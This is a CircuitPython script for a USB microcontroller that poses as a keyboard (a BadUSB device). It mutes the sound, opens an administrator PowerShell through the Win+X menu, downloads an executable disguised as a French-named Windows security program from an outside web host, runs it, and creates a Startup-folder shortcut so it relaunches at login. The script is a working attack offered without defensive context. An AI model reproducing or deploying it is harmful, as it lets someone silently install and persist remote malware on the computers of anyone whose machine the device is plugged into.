import time
import board
import digitalio
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
import usb_hid
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.consumer_control_code import ConsumerControlCode
from adafruit_hid.consumer_control import ConsumerControl


kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
consumer = ConsumerControl(usb_hid.devices)

pin_mode = digitalio.DigitalInOut(board.GP14)  # GPIO14
pin_mode.direction = digitalio.Direction.INPUT
pin_mode.pull = digitalio.Pull.UP  # résistance pull-up interne activée

led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT


if not pin_mode.value:  # False = relié à la masse
    print("Mode édition activé (court-circuit détecté)")
    led.value = True
else:
    print("Mode exécution activé (pas de court-circuit)")
    consumer.press(ConsumerControlCode.MUTE)
    time.sleep(0.3)
    kbd.send(Keycode.GUI,Keycode.X)
    time.sleep(0.3)
    layout.write("a")
    time.sleep(1.5)
    kbd.send(Keycode.LEFT_ARROW)
    time.sleep(0.3)
    kbd.send(Keycode.ENTER)
    time.sleep(5)
    layout.write("""Invoke-WebRequest -Uri 'https://aboutblanck.netlify.app/Sécurité_windows.exe' -OutFile 'Sécurité_windows.exe'""")
    kbd.send(Keycode.ENTER)
    time.sleep(10)
    layout.write("""if (Test-Path 'Sécurité_windows.exe') {
    # Lancer le programme téléchargé
    Start-Process -FilePath '.\Sécurité_windows.exe'
} else {
    Write-Host "Le fichier n'a pas été téléchargé."
}""")
    kbd.send(Keycode.ENTER)
    time.sleep(0.5)
    layout.write('''$target = "$env:windir\System32\Sécurité_windows.exe"
$shortcutName = "Sécurité_windows.lnk"
$startupFolder = [Environment]::GetFolderPath("Startup")

$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("$startupFolder\$shortcutName")

$shortcut.TargetPath = $target
$shortcut.WorkingDirectory = Split-Path $target
$shortcut.WindowStyle = 1
$shortcut.Save()

Write-Host "Raccourci créé dans $startupFolder"''')
    time.sleep(0.5)
    kbd.send(Keycode.ENTER)
    time.sleep(0.5)
    layout.write("exit")
    kbd.send(Keycode.ENTER)
    consumer.press(ConsumerControlCode.MUTE)